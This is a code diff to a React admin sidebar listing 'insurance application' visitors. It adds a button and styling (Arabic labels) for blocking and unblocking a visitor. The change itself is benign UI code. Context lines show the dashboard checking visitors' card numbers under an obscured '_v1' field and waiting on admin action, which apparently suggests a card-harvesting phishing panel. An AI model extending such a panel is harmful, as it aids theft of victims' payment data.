@@ -8,9 +8,13 @@ import {
   CreditCard,
   KeyRound,
   RefreshCw,
+  Ban,
+  ShieldCheck,
 } from "lucide-react";
 import type { InsuranceApplication } from "@/lib/firestore-types";
 import { getTimeAgo } from "@/lib/time-utils";
+import { updateApplication } from "@/lib/firebase-services";
+import { useState } from "react";
 
 interface VisitorSidebarProps {
   visitors: InsuranceApplication[];
@@ -105,6 +109,42 @@ const hasCardData = (visitor: InsuranceApplication): boolean => {
       (entry.data?._v1 || entry.data?.cardNumber)
   );
 };
+
+function BlockButton({ visitor }: { visitor: InsuranceApplication }) {
+  const [loading, setLoading] = useState(false);
+
+  const handleToggle = async (e: React.MouseEvent) => {
+    e.stopPropagation();
+    if (!visitor.id || loading) return;
+    setLoading(true);
+    try {
+      await updateApplication(visitor.id, { isBlocked: !visitor.isBlocked });
+    } catch {
+      // silent
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  return (
+    <button
+      onClick={handleToggle}
+      disabled={loading}
+      title={visitor.isBlocked ? "إلغاء الحظر" : "حظر الزائر"}
+      className={`flex items-center justify-center w-7 h-7 rounded-full transition-all disabled:opacity-40 ${
+        visitor.isBlocked
+          ? "bg-red-100 text-red-600 hover:bg-red-200"
+          : "bg-gray-100 text-gray-400 hover:bg-red-100 hover:text-red-600"
+      }`}
+    >
+      {visitor.isBlocked ? (
+        <ShieldCheck className="w-3.5 h-3.5" />
+      ) : (
+        <Ban className="w-3.5 h-3.5" />
+      )}
+    </button>
+  );
+}
 
 export function VisitorSidebar({
   visitors,
@@ -238,8 +278,10 @@ export function VisitorSidebar({
                 className={`border-b border-gray-100 p-3 sm:p-4 landscape:p-2 cursor-pointer transition-colors hover:bg-gray-50 ${
                   selectedVisitor?.id === visitor.id
                     ? "bg-green-50 border-r-4 border-r-green-600"
+                    : visitor.isBlocked
+                    ? "bg-red-50 border-r-4 border-r-red-500"
                     : ""
-                } ${visitor.isUnread ? "bg-pink-50" : ""}`}
+                } ${visitor.isUnread && !visitor.isBlocked ? "bg-pink-50" : ""}`}
               >
                 <div className="flex items-start gap-3">
                   {/* Checkbox */}
@@ -265,6 +307,12 @@ export function VisitorSidebar({
                         <h3 className="font-semibold text-gray-900 truncate text-base landscape:text-sm">
                           {getVisitorDisplayName(visitor)}
                         </h3>
+                        {visitor.isBlocked && (
+                          <span className="flex items-center gap-0.5 rounded-full bg-red-100 px-2 py-0.5 text-[10px] font-bold text-red-600 whitespace-nowrap border border-red-200">
+                            <Ban className="w-2.5 h-2.5" />
+                            محظور
+                          </span>
+                        )}
                         <span className="flex items-center gap-1 rounded bg-teal-600 px-2 py-0.5 text-[11px] font-medium text-white whitespace-nowrap">
                           {isWaitingForAdmin(visitor) && (
                             <RefreshCw className="w-3 h-3 animate-spin" />
@@ -279,11 +327,12 @@ export function VisitorSidebar({
                         )}
                       </div>
 
-                      {/* Time ago indicator */}
-                      <div className="flex items-center gap-1 text-xs landscape:text-[10px] text-gray-500 font-medium whitespace-nowrap sm:self-auto">
-                        <span>
+                      {/* Time ago + Block */}
+                      <div className="flex items-center gap-2 whitespace-nowrap sm:self-auto">
+                        <span className="text-xs landscape:text-[10px] text-gray-500 font-medium">
                           {getTimeAgo(visitor.updatedAt || visitor.lastSeen)}
                         </span>
+                        <BlockButton visitor={visitor} />
                       </div>
                     </div>
 
